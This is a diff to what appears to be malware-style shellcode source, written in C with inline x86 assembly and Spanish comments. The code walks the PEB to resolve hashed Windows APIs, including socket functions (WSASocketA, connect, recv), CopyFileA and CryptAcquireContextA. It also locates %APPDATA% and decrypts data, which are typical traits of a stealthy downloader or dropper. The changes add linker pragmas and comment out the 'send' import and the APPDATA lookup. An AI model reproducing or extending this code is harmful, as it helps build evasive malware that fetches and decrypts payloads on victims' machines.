@@ -6,6 +6,9 @@
 **    ¡¡¡EDITAR 'macros.h' PARA SELECCIONAR LA COMPILACIÓN CONDICIONADA!!!
 *###############################################################################*/
 
+#pragma comment(linker,"/SUBSYSTEM:WINDOWS,5.00")
+#pragma comment(linker,"/OSVERSION:5.00")
+
 //No queremos que muestre el warning de etiqueta sin referencia, 
 //ya que las usamos para mejorar la legibilidad del código
 #pragma warning(disable:4102)
@@ -82,12 +85,12 @@ kernel32_symbol_hashes:
         API_DEFINE(CopyFileA, ('C') ('o') ('p') ('y') ('F') ('i') ('l') ('e') ('A'))
 
 ws2_32_symbol_hashes:
-        #define ws2_32_count    8
+        #define ws2_32_count    7
         API_DEFINE(WSASocketA, ('W') ('S') ('A') ('S') ('o') ('c') ('k') ('e') ('t') ('A'))
         API_DEFINE(connect, ('c') ('o') ('n') ('n') ('e') ('c') ('t'))
         API_DEFINE(WSAStartup, ('W') ('S') ('A') ('S') ('t') ('a') ('r') ('t') ('u') ('p'))
         API_DEFINE(closesocket, ('c') ('l') ('o') ('s') ('e') ('s') ('o') ('c') ('k') ('e') ('t'))
-        API_DEFINE(send, ('s') ('e') ('n') ('d'))
+        //API_DEFINE(send, ('s') ('e') ('n') ('d'))
         API_DEFINE(inet_addr, ('i') ('n') ('e') ('t') ('_') ('a') ('d') ('d') ('r'))
         API_DEFINE(gethostbyname, ('g') ('e') ('t') ('h') ('o') ('s') ('t') ('b') ('y') ('n') ('a') ('m') ('e'))
         API_DEFINE(recv, ('r') ('e') ('c') ('v'))
@@ -200,7 +203,7 @@ start:
         ** Obtención de %APPDATA%:
         ** Aprovechamos que hemos sacado el PEB para obtener kernel32 y
         ** recorremos el bloque de environments en busca de APPDATA=*
-        *###############################################################################*/
+        *###############################################################################
         push eax                        //Guardamos EAX
         push edi                        //Guardamos el Delta
         mov  eax, [eax+0x10]            //EAX = &RTL_USER_PROCESS_PARAMETERS
@@ -215,6 +218,7 @@ redo:
         mov  [ebp+_APPDATA], edi        //Almacenamos el puntero a APPDATA (UNICODE)
         pop  edi                        //Recuperamos el Delta
         pop  eax                        //Recuperamos EAX
+        */
         mov  esi, [eax+0x0C]            //ESI = PEB->Ldr
         mov  esi, [esi+0x1C]            //ESI = PEB->Ldr.InInitOrder[0]
 next_module:
@@ -471,6 +475,7 @@ init_decrypt:
         push ebp                        //v
         add  [esp], _hProv              //v
         call [ebp+_CryptAcquireContextA]//>CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
+
         //Importamos la clave
         cdq                             //EDX = 0
         push ebp                        //v
